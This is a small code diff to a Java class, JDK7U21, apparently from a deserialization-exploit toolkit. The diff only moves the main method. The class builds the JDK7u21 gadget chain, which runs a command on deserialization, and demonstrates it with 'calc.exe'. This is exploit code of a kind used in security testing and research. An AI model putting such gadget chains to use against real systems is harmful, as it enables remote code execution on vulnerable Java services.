@@ -7,6 +7,12 @@ import java.util.LinkedHashSet;
 
 @SuppressWarnings("all")
 public class JDK7U21 {
+    public static void main(final String[] args) throws Exception {
+        JDK7U21 c = new JDK7U21();
+        Object o = c.getObject("calc.exe");
+        SerUtil.deserializeObject(SerUtil.serializeObject(o));
+    }
+
     public Object getObject(final String command) throws Exception {
         final Object templates = Gadgets.createTemplatesImpl(command);
 
@@ -30,11 +36,5 @@ public class JDK7U21 {
         map.put(zeroHashCodeStr, templates); // swap in real object
 
         return set;
-    }
-
-    public static void main(final String[] args) throws Exception {
-        JDK7U21 c = new JDK7U21();
-        Object o = c.getObject("calc.exe");
-        SerUtil.deserializeObject(SerUtil.serializeObject(o));
     }
 }
